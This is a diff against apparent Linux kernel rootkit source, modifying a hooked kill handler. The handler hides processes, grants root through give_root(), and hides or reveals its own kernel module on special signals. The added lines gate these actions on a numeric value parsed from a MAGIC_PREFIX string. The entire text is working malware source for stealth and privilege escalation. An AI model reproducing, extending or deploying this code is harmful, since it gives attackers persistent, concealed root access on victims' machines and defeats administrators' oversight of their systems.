@@ -314,18 +314,33 @@ hacked_kill(pid_t pid, int sig)
 {
 #endif
 	struct task_struct *task;
+	
+	int magicPrefixNum = 0;//ADDED
+    const char *prefix = MAGIC_PREFIX;//ADDED
+    for (int i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
+        if (prefix[i] >= '0' && prefix[i] <= '9') {// Check if the current character is a digit
+            magicPrefixNum = magicPrefixNum * 10 + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
+        }
+    }
+
 	switch (sig) {
 		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
+			if(pid == magicPrefixNum){//ADDED
+				if ((task = find_task(pid)) == NULL)
+					return -ESRCH;
+				task->flags ^= PF_INVISIBLE;
+			}
 			break;
 		case SIGSUPER:
-			give_root();
+			if(pid == magicPrefixNum) {//ADDED
+				give_root();
+			}
 			break;
 		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
+			if(pid == magicPrefixNum){//ADDED
+				if (module_hidden) module_show();
+				else module_hide();
+			}
 			break;
 		default:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
